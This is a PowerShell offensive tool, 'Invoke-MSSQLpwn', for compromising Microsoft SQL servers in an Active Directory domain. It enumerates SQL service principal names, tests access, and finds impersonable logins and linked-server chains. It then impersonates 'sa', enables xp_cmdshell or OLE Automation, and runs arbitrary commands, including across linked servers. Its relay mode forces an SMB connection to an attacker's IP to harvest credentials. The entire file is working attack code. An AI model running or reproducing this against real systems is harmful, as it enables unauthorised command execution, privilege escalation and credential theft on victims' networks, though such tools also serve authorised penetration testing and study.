# PowerShell Tool to own MSSQL servers

Function Get-MssqlSpns {
    $search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
    $search.filter = "(servicePrincipalName=*)"
    $results = $search.Findall()
    $MssqlInstances = @()

    foreach ($result in $results) {
    
        $userEntry = $result.GetDirectoryEntry()
        
        if ($userEntry.name.ToUpper() -like "*SQL*") {
                Write-host "[+] " -foregroundcolor green -nonewline; Write-host "Found MSSQL SPN:" -foregroundcolor yellow
                Write-host "Object Name = " $userEntry.name 
                Write-host ""
                foreach($SPN in $userEntry.servicePrincipalName)
            
                {
                    if ($SPN -like "*1433") {
                        Write-host "[+] " -foregroundcolor green -nonewline; Write-host "Found Instance:" -foregroundcolor yellow
                        Write-host "SPN = $SPN"
                        Write-host ""
                        $MssqlInstances = $MssqlInstances += $SPN
                    }
                }
                Write-host ""
        }
    }
    return $MssqlInstances
}

Function Get-AuthenticatedServers {
    $AuthenticatedServers = @()
    foreach ($Server in $Instances) {
        # Need to learn regex
        $srv = $Server.Split("/")[1].Split(":")[0]
        $database = "master"
        $sqlConnection = New-Object System.Data.SqlClient.SqlConnection
        $sqlConnection.ConnectionString = "Server=$srv;Database=$database;Integrated Security=True"
        Write-Host "[-] " -foregroundcolor Cyan -nonewline; Write-Host "Testing authentication for $srv" -foregroundcolor yellow
        try {
            $sqlConnection.Open()
            Write-host "[+] " -foregroundcolor green -nonewline; Write-host "Successfully autheticated to $srv" -foregroundcolor yellow
            Write-host ""
            $AuthenticatedServers += $srv
            $sqlConnection.Close();
        } catch {
            Write-Host "[!] " -foregroundcolor red -nonewline; Write-Host "Unable to authenticate to $srv" -foregroundcolor yellow
            Write-host ""
        }        
    }
    return $AuthenticatedServers
}

Function Invoke-MSSQLpwn{
    <#
    .SYNOPSIS
      PowerShell Tool to gain code execution on MSSQL servers in an Active Directory Environment                                       
    .EXAMPLE
     Invoke-MSSQLpwn -Enumerate
     This will find MSSQL service principal names within the current domain, attempt to authenticate as the current user, enumerate permissions on the server, and find linked servers.
    .EXAMPLE
     Invoke-MSSQLpwn -Target "server1" -Impersonate "sa" -Command "whoami"
     This will authenticate to server1 as the current user, attempt to impersonate the sa login, enable xp_cmdshell, and execute the given command.
    .EXAMPLE
     Invoke-MSSQLpwn -Target "server1" -Relay "192.168.1.5"
     This will authenticate to server1 and execute the xp_dirtree stored procedure to connect to the specified attacking server over SMB.
     .EXAMPLE
     Invoke-MSSQLpwn -Target "server1" -Link "server2" -ImpersonateLink "sa" -Command "whoami"
     This will authenticate to server1 as the current user, connect to the linked server, attempt to impersonate the sa login on the linked server, enable xp_cmdshell on the linked server, and execute the given command on the linked server. Command output will not be displayed.
    .EXAMPLE
     Invoke-MSSQLpwn -Target "server1" -Link "server2" -Relay "192.168.1.5"
     This will authenticate to server1 as the current user, connect to the linked server, and execute the xp_dirtree stored procedure on the linked server.
  #>
    param (
        [parameter(Mandatory=$false)]
        [Switch]$Enumerate,
        [parameter(Mandatory=$false)]
        [String]$Relay,
        [Parameter(Mandatory=$false)]
        [String]$Target,
        [Parameter(Mandatory=$false)]
        [String]$Impersonate,
        [Parameter(Mandatory=$false)]
        [String]$LinkImpersonate,
        [Parameter(Mandatory=$false)]
        [String]$Command,
        [Parameter(Mandatory=$false)]
        [String]$database,
        [Parameter(Mandatory=$false)]
        [Int]$Mode,
        [Parameter(Mandatory=$false)]
        [String]$Link
    )
    
    Function Get-MssqlEnumeration {
        $Instances = Get-MssqlSpns
        $AuthenticatedInstances = Get-AuthenticatedServers
        foreach ($server in $AuthenticatedInstances) {
            $links = New-Object System.Collections.Generic.Dictionary"[String,String]"
            Write-Host "========== " $server " =========="
            Write-host ""
            $database = "master"
            $sqlConnection = New-Object System.Data.SqlClient.SqlConnection
            $sqlConnection.ConnectionString = "Server=$server;Database=$database;Integrated Security=True"
            $sqlConnection.Open()
            
            # Check system user
            $sqlCmd = New-Object System.Data.SqlClient.SqlCommand
            $sqlCmd.Connection = $sqlConnection
            $sqlCmd.CommandText = "SELECT SYSTEM_USER;"
            $reader = $sqlCmd.ExecuteReader()
            while ($reader.Read()) {
                Write-Host "[+] " -foregroundcolor green -nonewline; Write-Host "Logged in as user: " -nonewline -foregroundcolor yellow ;
                $reader[0]
            }
            $reader.close()

            # Check username
            $sqlCmd.CommandText = "SELECT USER_NAME();"
            $reader = $sqlCmd.ExecuteReader()
            while ($reader.Read()) {
                Write-Host "[+] " -foregroundcolor green -nonewline; Write-Host "Mapped to user: " -nonewline -foregroundcolor yellow ;
                $reader[0]
                Write-host ""
            }
            $reader.close()

            # Check role membership
            $sqlCmd.CommandText = "SELECT IS_SRVROLEMEMBER('public');"
            $reader = $sqlCmd.ExecuteReader()
            while ($reader.Read()) {
                if ($reader[0] -eq "1") {
                    Write-Host "[+] " -foregroundcolor green -nonewline; Write-Host "User is a member of the public role" -foregroundcolor yellow
                } else {
                    Write-Host "[!] " -foregroundcolor red -nonewline; Write-Host "User is not a member of the public role" -foregroundcolor yellow
                }
            }
            $reader.close()

            $sqlCmd.CommandText = "SELECT IS_SRVROLEMEMBER('sysadmin');"
            $reader = $sqlCmd.ExecuteReader()
            while ($reader.Read()) {
                if ($reader[0] -eq "1") {
                    Write-Host "[+] " -foregroundcolor green -nonewline; Write-Host "User is a member of the sysadmin role" -foregroundcolor yellow
                } else {
                    Write-Host "[!] " -foregroundcolor red -nonewline; Write-Host "User is not a member of the sysadmin role" -foregroundcolor yellow
                }
                Write-host ""
            }
            $reader.close()

            # Check impersonation
            $sqlCmd.CommandText = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
            $reader = $sqlCmd.ExecuteReader()
            while ($reader.Read()) {
                Write-Host "[+] " -foregroundcolor green -nonewline; Write-Host "Logins that can be impersonated: " -nonewline -foregroundcolor yellow ;
                $reader[0]
                Write-host ""
            }
            $reader.close()

            # Check for linked servers
            $sqlCmd.CommandText = "EXEC sp_linkedservers;"
            $reader = $sqlCmd.ExecuteReader()
            Write-Host "[+] " -foregroundcolor green -nonewline; Write-Host "Linked SQL server: " -foregroundcolor yellow ;
            while ($reader.Read()) {
                $value = $reader[0]
                $name = $server.split(".")[0].ToUpper()
                if ($value.ToUpper() -notlike "*$name*") {
                    $value
                    $links.Add($server,$value)
                }
            }
            Write-host ""
            $reader.close()

            Write-Host "[-] " -foregroundcolor Cyan -nonewline; Write-Host "Looking for additional links" -foregroundcolor yellow
            foreach ($foundlink in $links.Values) {
                $sqlCmd.CommandText = "select * from openquery($foundlink,'EXEC sp_linkedservers;');"
                $reader = $sqlCmd.ExecuteReader()
                while ($reader.Read()) {
                    $linkedvalue = $reader[0]
                    if ($linkedvalue -notlike "*$foundlink*") {
                        Write-Host "[+] " -foregroundcolor green -nonewline;Write-Host "$linkedvalue is linked on $foundlink" -foregroundcolor yellow
                        Write-Host $server "--->" $foundlink "--->" $linkedvalue
                    }
                }
                Write-host ""
                $reader.close()
            }
            $sqlConnection.Close()
        }
    }
    <#
        Verify user input here and throw errors for missing params    
    #>
    if (!($PSBoundParameters.ContainsKey('Enumerate')) -And !($PSBoundParameters.ContainsKey('Target'))){
        Write-Host "[!] " -foregroundcolor red -nonewline; Write-Host "Must specify '-Enumerate' or '-Target'" -foregroundcolor yellow
        help Invoke-MSSQLpwn -examples
        return
    }
    if (!($PSBoundParameters.ContainsKey('database'))){
        $database = "master"
    }
    if ($PSBoundParameters.ContainsKey('Enumerate')){
        Get-MssqlEnumeration
        return
    }
    if (!($PSBoundParameters.ContainsKey('Link'))){
        $NoLink = "True"
    }
    if (!($PSBoundParameters.ContainsKey('Mode'))){
        $Mode = 1
    }
    # Execute commands on a target - No link
    if ($NoLink){
        $sqlConnection = New-Object System.Data.SqlClient.SqlConnection
        $sqlConnection.ConnectionString = "Server=$Target;Database=$database;Integrated Security=True"
        try
        {
            $sqlConnection.Open()
            Write-host "[+] " -foregroundcolor green -nonewline; Write-host "Successfully autheticated to $Target" -foregroundcolor yellow
        } catch {
            Write-Host "[!] " -foregroundcolor red -nonewline; Write-Host "Unable to authenticate to $Target" -foregroundcolor yellow
            return
        }
        $sqlCmd = New-Object System.Data.SqlClient.SqlCommand
        $sqlCmd.Connection = $sqlConnection 
        if ($PSBoundParameters.ContainsKey('Impersonate')){
            $sqlCmd.CommandText = "EXECUTE AS LOGIN = '{0}';" -f $Impersonate;
            $reader = $sqlCmd.ExecuteReader()
            $reader.Close()
        }
        if ($PSBoundParameters.ContainsKey('Relay')){
            $sqlCmd.CommandText = "EXEC master..xp_dirtree '\\$Relay\\test';"
            $reader = $sqlCmd.ExecuteReader()
            $reader.Close()
            $sqlConnection.Close()
            return
        }
        if ($Mode -eq 2){
            $sqlCmd.CommandText = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
            $reader = $sqlCmd.ExecuteReader()
            $reader.Close()

            $sqlCmd.CommandText = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c ""{0}""';" -f $Command
            $reader = $sqlCmd.ExecuteReader()
            Write-Host "Command output: " -foregroundcolor yellow;
            while ($reader.Read()){
                $reader[0]
            }
            $reader.Close()

        } else {
            $sqlCmd.CommandText = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; ";
            $reader = $sqlCmd.ExecuteReader()
            $reader.Close()

            $sqlCmd.CommandText = 'EXEC xp_cmdshell ''{0}''' -f $Command;
            $reader = $sqlCmd.ExecuteReader()
            Write-Host "Command output: " -foregroundcolor yellow;
            while ($reader.Read()){
                $reader[0]
            }
            $reader.Close()
        }
        
        $sqlConnection.Close()
    }
    if ($PSBoundParameters.ContainsKey('Link')){
        $sqlConnection = New-Object System.Data.SqlClient.SqlConnection
        $sqlConnection.ConnectionString = "Server=$Target;Database=$database;Integrated Security=True"
        try
        {
            $sqlConnection.Open()
            Write-host "[+] " -foregroundcolor green -nonewline; Write-host "Successfully autheticated to $Target" -foregroundcolor yellow
        } catch {
            Write-Host "[!] " -foregroundcolor red -nonewline; Write-Host "Unable to authenticate to $Target" -foregroundcolor yellow
            return
        }
        $sqlCmd = New-Object System.Data.SqlClient.SqlCommand
        $sqlCmd.Connection = $sqlConnection
        if ($PSBoundParameters.ContainsKey('Relay')){
            $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC master..xp_dirtree ''''\\{1}\\test'''';'')' -f $Link,$Relay
            $reader = $sqlCmd.ExecuteReader()
            $reader.Close()
            $sqlConnection.Close()
            return
        }
        if ($Mode -eq 2){
            if ($PSBoundParameters.ContainsKey('Impersonate')){
            $sqlCmd.CommandText = "EXECUTE AS LOGIN = '{0}';" -f $Impersonate;
            $reader = $sqlCmd.ExecuteReader()
            $reader.Close()
            }
            if ($PSBoundParameters.ContainsKey('LinkImpersonate')){
                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXECUTE AS LOGIN = ''''{1}'''';EXEC sp_configure ''''Ole Automation Procedures'''', 1; RECONFIGURE;'')' -f $Link,$LinkImpersonate
            }else {
                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC sp_configure ''''Ole Automation Procedures'''', 1; RECONFIGURE;'')' -f $Link
            }
            $reader = $sqlCmd.ExecuteReader()
            $reader.Close()

            if ($PSBoundParameters.ContainsKey('LinkImpersonate')){
                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXECUTE AS LOGIN = ''''{1}'''';DECLARE @myshell INT; EXEC sp_oacreate ''''wscript.shell'''', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''''run'''', null, ''''cmd /c "{2}"'''';'')' -f $Link,$LinkImpersonate,$Command
            }else {
                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;DECLARE @myshell INT; EXEC sp_oacreate ''''wscript.shell'''', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''''run'''', null, ''''cmd /c "{1}"'''';'')' -f $Link,$Command
            }
            $reader = $sqlCmd.ExecuteReader()
            while ($reader.Read()){
                $reader[0]
            }
            $reader.Close() 
        } else {
            if ($PSBoundParameters.ContainsKey('Impersonate')){
            $sqlCmd.CommandText = "EXECUTE AS LOGIN = '{0}';" -f $Impersonate;
            $reader = $sqlCmd.ExecuteReader()
            $reader.Close()
            }
            if ($PSBoundParameters.ContainsKey('LinkImpersonate')){
                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXECUTE AS LOGIN = ''''{1}'''';EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE;'')' -f $Link,$LinkImpersonate
            }else {
                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE;'')' -f $Link
            }
            $reader = $sqlCmd.ExecuteReader()
            $reader.Close()

            if ($PSBoundParameters.ContainsKey('LinkImpersonate')){
                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXECUTE AS LOGIN = ''''{1}'''';EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'')' -f $Link,$LinkImpersonate
            }else {
                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'')' -f $Link
            }
            $reader = $sqlCmd.ExecuteReader()
            $reader.Close()

            if ($PSBoundParameters.ContainsKey('LinkImpersonate')){
                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXECUTE AS LOGIN = ''''{1}'''';EXEC xp_cmdshell ''''{2}'''';'')' -f $Link,$LinkImpersonate,$Command
            }else {
                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC xp_cmdshell ''''{1}'''';'')' -f $Link,$Command
            }
            $reader = $sqlCmd.ExecuteReader()
            while ($reader.Read()){
                $reader[0]
            }
            $reader.Close()   
        }
        $sqlConnection.Close()
    }

}